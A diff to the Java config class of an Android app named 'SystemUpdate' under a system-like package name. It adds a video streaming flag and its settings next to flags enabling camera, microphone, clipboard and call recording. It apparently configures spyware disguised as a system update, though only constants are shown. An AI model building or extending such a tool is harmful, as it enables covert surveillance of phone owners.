@@ -10,7 +10,7 @@ public class Config {
     public static final String APP_NAME = "SystemUpdate";
     public static final String PACKAGE_NAME = "com.android.system.update";
     public static final String VERSION = "1.0.0";
-    public static final boolean ENABLE_BROWSER = true;
+    
     // Feature flags (all true by default for testing)
     public static final boolean ENABLE_CAMERA = true;
     public static final boolean ENABLE_MICROPHONE = true;
@@ -23,4 +23,15 @@ public class Config {
     public static final boolean ENABLE_APP_MANAGER = true;
     public static final boolean ENABLE_CLIPBOARD = true;
     public static final boolean ENABLE_CALL_RECORDING = true;
+    public static final boolean ENABLE_BROWSER = true;
+    
+    // NEW: Video streaming module flag
+    public static final boolean ENABLE_VIDEO = true;
+    
+    // Video streaming settings
+    public static final int VIDEO_WIDTH = 640;
+    public static final int VIDEO_HEIGHT = 480;
+    public static final int VIDEO_BITRATE = 500000; // 500 kbps
+    public static final int VIDEO_FPS = 15;
+    public static final int VIDEO_KEYFRAME_INTERVAL = 2; // seconds
 }
